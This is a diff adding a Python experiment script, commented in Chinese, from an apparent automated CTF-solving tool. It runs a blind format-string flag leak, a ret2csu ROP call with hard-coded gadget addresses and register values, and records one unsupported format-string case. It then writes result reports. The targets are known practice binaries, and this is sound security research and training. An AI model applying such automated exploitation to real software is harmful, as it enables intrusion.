@@ -1,0 +1,139 @@
+"""
+v037_more_real.src — 第五轮真实赛题：fmt 泄漏、csu 调用、fmt 写边界
+
+题目
+    echo       picoCTF 2018：flag 读入栈后循环 printf(input)，盲泄漏；
+    ret2csu    ROP Emporium：用 __libc_csu 设置 rdi/rsi/rdx 调 ret2win；
+    greeting   TWCTF 2016：格式串在堆上，%n 地址不可达（记录边界）。
+
+运行
+    python versions/v037_more_real.src
+"""
+
+from __future__ import annotations
+
+import json
+import sys
+import time
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0037"
+REAL_DIR = OUT_DIR / "real"
+
+sys.path.insert(0, str(ROOT / "src"))
+
+from secknow.solving.adapters import PwntoolsWorker, ToolUnavailable  # noqa: E402
+from secknow.solving.binary import analyze  # noqa: E402
+from secknow.solving.chains import build_chains  # noqa: E402
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+CASES = [
+    {"id": "echo", "note": "picoCTF 2018：栈上 flag 盲泄漏", "strategy": "fmtstr_blind"},
+    {"id": "ret2csu", "note": "ROP Emporium：csu 设置参数调 ret2win",
+     "strategy": "csu"},
+    {"id": "greeting", "note": "TWCTF 2016：格式串在堆上，%n 不可达",
+     "strategy": "unsupported", "reason": "fmt_buffer_not_on_stack"},
+]
+
+
+def evaluate(worker: PwntoolsWorker, case: dict) -> dict:
+    binary = REAL_DIR / case["id"]
+    started = time.perf_counter()
+    record = {"id": case["id"], "note": case["note"], "strategy": case["strategy"]}
+    try:
+        profile = analyze(binary)
+        record.update({
+            "bits": profile.bits, "pie": profile.is_pie,
+            "entries": [finding.category for finding in profile.findings()],
+            "chains": [{"id": chain.chain_id, "status": chain.status}
+                       for chain in build_chains(
+                           [finding.category for finding in profile.findings()], profile)],
+        })
+    except Exception as error:  # noqa: BLE001
+        record.update({"verdict": "failed", "reason": f"analyze:{type(error).__name__}"})
+        record["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+        return record
+
+    if case["strategy"] == "unsupported":
+        record.update({"verdict": "unsupported", "reason": case["reason"]})
+    elif case["strategy"] == "fmtstr_blind":
+        try:
+            result = worker.fmtstr_blind_leak(binary)
+        except ToolUnavailable as error:
+            record.update({"verdict": "failed", "reason": str(error)})
+        else:
+            record["input"] = result.get("leak")
+            record.update({"verdict": "solved" if result.get("solved") else "failed",
+                           "reason": None if result.get("solved") else "leak_failed"})
+    elif case["strategy"] == "csu":
+        try:
+            result = worker.csu_call(binary, 0x28, 0x600E38, 0x4007B1,
+                                     rdi=0x600E38, rsi=0xF,
+                                     rdx=0xDEADCAFEBABEBEEF, marker="flag")
+        except ToolUnavailable as error:
+            record.update({"verdict": "failed", "reason": str(error)})
+        else:
+            record["input"] = (result.get("output") or "")[-60:].strip()
+            record.update({"verdict": "solved" if result.get("solved") else "failed",
+                           "reason": None if result.get("solved") else "no_flag_output"})
+    else:
+        record.update({"verdict": "unsupported", "reason": "no_strategy"})
+    record["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+    log(f"{case['id']}: {record['verdict']} ({record.get('reason') or '—'})"
+        f"  {record['elapsed_ms']} ms")
+    return record
+
+
+def write_report(results: list[dict]) -> None:
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    summary = {
+        "cases": len(results),
+        "solved": sum(1 for item in results if item.get("verdict") == "solved"),
+        "unsupported": sum(1 for item in results if item.get("verdict") == "unsupported"),
+        "failed": sum(1 for item in results if item.get("verdict") == "failed"),
+    }
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "cases": results}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+    lines = ["# EXP-0037 — 第五轮真实赛题", "",
+             "## 汇总", "", "```json", json.dumps(summary, ensure_ascii=False, indent=2),
+             "```", "",
+             "| 题 | 判定 | 链 | 说明 | 耗时 |",
+             "| --- | --- | --- | --- | --- |"]
+    for item in results:
+        chains = ", ".join(chain["id"] for chain in item.get("chains", [])) or "—"
+        lines.append(f"| {item['id']} | {item.get('verdict')} | {chains} "
+                     f"| {item.get('input') or item.get('reason') or item['note']} "
+                     f"| {item.get('elapsed_ms')} ms |")
+    lines += ["", "## 说明", "",
+              "- echo：flag 在栈上，位置参数 %N$lx 重建；",
+              "- ret2csu：csu 设置 rdi/rsi/rdx 后跳到 ret2win，解出 flag{flag}；",
+              "- greeting：getline 把格式串放在堆上，栈参数扫不到地址，%n 不可达。"]
+    (OUT_DIR / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+
+def main() -> None:
+    worker = PwntoolsWorker()
+    log(f"worker available={worker.available(timeout=60)} version={worker.version}")
+    results = [evaluate(worker, case) for case in CASES]
+    worker.close()
+    write_report(results)
+    summary = json.loads((OUT_DIR / "results.json").read_text(encoding="utf-8"))["summary"]
+    log(f"汇总：解出 {summary['solved']}/{summary['cases']}，"
+        f"不支持 {summary['unsupported']}，失败 {summary['failed']}")
+
+
+if __name__ == "__main__":
+    main()
